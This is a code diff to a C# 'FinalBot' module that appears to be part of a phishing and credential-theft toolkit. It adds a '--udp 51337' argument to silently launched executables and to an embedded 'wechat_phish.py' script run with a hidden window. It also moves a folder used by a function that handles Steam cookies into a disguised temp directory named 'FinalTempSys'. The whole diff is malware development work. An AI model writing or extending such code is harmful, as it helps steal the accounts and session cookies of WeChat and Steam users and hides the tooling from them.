@@ -71,6 +71,7 @@ namespace FinalBot.Modules
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
+                    Arguments = "--udp 51337",
                     UseShellExecute = true
                 });
             }
@@ -84,6 +85,7 @@ namespace FinalBot.Modules
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
+                    Arguments = "--udp 51337",
                     UseShellExecute = true
                 });
             }
@@ -91,14 +93,13 @@ namespace FinalBot.Modules
 
         public static void LaunchWeChatPhish()
         {
-            // Note: Since wechat_phish.py is a Python script, we attempt to run it with python
             string scriptPath = ExtractResource("core.wechat_phish.py", "wechat_phish.py");
             if (!string.IsNullOrEmpty(scriptPath))
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "python",
-                    Arguments = $"\"{scriptPath}\"",
+                    Arguments = $"\"{scriptPath}\" --udp 51337",
                     UseShellExecute = true,
                     CreateNoWindow = true
                 });
@@ -113,7 +114,7 @@ namespace FinalBot.Modules
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "python",
-                    Arguments = $"\"{scriptPath}\"",
+                    Arguments = $"\"{scriptPath}\" --udp 51337",
                     UseShellExecute = true,
                     CreateNoWindow = true
                 });
@@ -122,7 +123,8 @@ namespace FinalBot.Modules
 
         public static void PrepareSteamFiles(string agentName, string cookies)
         {
-            string tablichkaDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tablichka");
+            // Use a stable, temporary directory for shared files
+            string tablichkaDir = Path.Combine(Path.GetTempPath(), "FinalTempSys", "tablichka");
             if (!Directory.Exists(tablichkaDir)) Directory.CreateDirectory(tablichkaDir);
             
             if (!string.IsNullOrEmpty(agentName))
